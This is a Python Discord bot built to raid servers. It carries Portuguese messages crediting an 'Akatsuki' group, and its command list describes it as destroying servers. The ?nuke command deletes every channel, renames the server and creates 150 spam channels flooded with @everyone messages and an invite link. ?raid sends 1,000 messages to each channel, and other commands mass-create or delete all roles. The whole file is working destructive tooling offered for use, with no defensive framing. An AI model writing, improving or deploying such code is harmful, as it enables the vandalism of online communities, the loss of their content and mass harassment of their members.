import discord
from discord.ext import commands
import aiohttp
import asyncio
import random

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="?", intents=intents)

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    async def delete_channels():
        tasks = [
            channel.delete() 
            for channel in guild.channels 
            if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel))
        ]
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def disable_community():
        try:
            await guild.edit(community=False)
        except:
            pass

    async def change_server_name():
        try:
            await guild.edit(name="🫪 DESTROYED BY AKATSUKI COMMUNITY 🫪")
        except:
            pass

    async def create_channels():
        channel_names = [
            "「👿」ɾᥲɩᑯᥱᑯ-ᑲყ-ᥲƙᥲt⳽ᥙƙɩ",
            "「🌪️」ɾᥲɩᑯᥱᑯ-ᑲყ-ᥲƙᥲt⳽ᥙƙɩ",
            "「🤣」ɾᥲɩᑯᥱᑯ-ᑲყ-ᥲƙᥲt⳽ᥙƙɩ",
            "「👾」ɾᥲɩᑯᥱᑯ-ᑲყ-ᥲƙᥲt⳽ᥙƙɩ",
            "「🐒」ɾᥲɩᑯᥱᑯ-ᑲყ-ᥲƙᥲt⳽ᥙƙɩ",
            "「☁️」ɾᥲɩᑯᥱᑯ-ᑲყ-ᥲƙᥲt⳽ᥙƙɩ"
        ]
        tasks = [guild.create_text_channel(random.choice(channel_names)) for _ in range(150)]
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.1)

    async def spam_channels():
        await asyncio.sleep(0.1)
        
        async def send_spam(channel):
            for _ in range(14):
                try:
                    embed1 = discord.Embed(
                        title="👿 ESSE SERVIDOR FOI DESTRUÍDO PELA AKAT? 🤔",
                        description="# AKATSUKI DESTRUÍNDO SERVIDORES 24 HORAS POR DIA KKKKKKK",
                        color=0x010101
                    )
                    embed1.set_image(url="https://cdn.discordapp.com/attachments/1493409500785541210/1550729992965459988/c9346712-368d-4017-9549-33f875f40bea_D3C49708-5B16-40AD-843D-8CC63C5F3915.jpg?ex=6aaf6559&is=6aae13d9&hm=b35e25acf573626f52ba907a342e7d8ecad895608db2259f133d3fec9e874f35&")

                    embed2 = discord.Embed(
                        title="😈 SEU SERVIDOR FOI RAIDADO PELA AKAT 👻",
                        description="# BONDE DA AKATSUKI PASSANDO POR AQUI, SERVIDOR MOGGADO COMO SUCCESO!",
                        color=0x580000
                    )

                    await channel.send(
                        content="@everyone\n# https://discord.gg/alonenow", 
                        embeds=[embed1, embed2]
                    )
                except:
                    pass

        tasks = [send_spam(channel) for channel in guild.text_channels]
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.1)

    await delete_channels()
    
    await asyncio.gather(
        disable_community(),
        change_server_name(),
        return_exceptions=True
    )

    await create_channels()
    await spam_channels()


@bot.command()
async def raid(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    async def send_raid_message(channel):
        for _ in range(1000):
            try:
                embed1 = discord.Embed(
                    title="👿 ESSE SERVIDOR FOI DESTRUÍDO PELA AKAT? 🤔",
                    description="# AKATSUKI DESTRUÍNDO SERVIDORES 24 HORAS POR DIA KKKKKKK",
                    color=0x010101
                )
                embed1.set_image(url="https://cdn.discordapp.com/attachments/1493409500785541210/1550729992965459988/c9346712-368d-4017-9549-33f875f40bea_D3C49708-5B16-40AD-843D-8CC63C5F3915.jpg?ex=6aaf6559&is=6aae13d9&hm=b35e25acf573626f52ba907a342e7d8ecad895608db2259f133d3fec9e874f35&")

                embed2 = discord.Embed(
                    title="😈 SEU SERVIDOR FOI RAIDADO PELA AKAT 👻",
                    description="# BONDE DA AKATSUKI PASSANDO POR AQUI, SERVIDOR MOGGADO COMO SUCCESO!",
                    color=0x580000
                )

                await channel.send(
                    content="@everyone\n# https://discord.gg/alonenow", 
                    embeds=[embed1, embed2]
                )
            except:
                pass

    tasks = [send_raid_message(channel) for channel in guild.text_channels]
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def create_roles(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    tasks = [guild.create_role(name="pansi mogged you") for _ in range(50)]
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def delete_roles(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    tasks = [role.delete() for role in guild.roles if role != guild.default_role and role < guild.me.top_role]
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def cmds(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
        title="**__Lista de Comandos__**",
        description="`?nuke` _Destroi o servidor completamente._\n`?raid` _Manda 1.000 mensagens em todos os canais._\n`?create_roles` _Cria 50 cargos._\n`?delete_roles` _Deleta todos os cargos._",
        color=0x580000
    )
    embed.set_footer(text="pansi mogged you")
    await ctx.send(embed=embed)

bot.run("")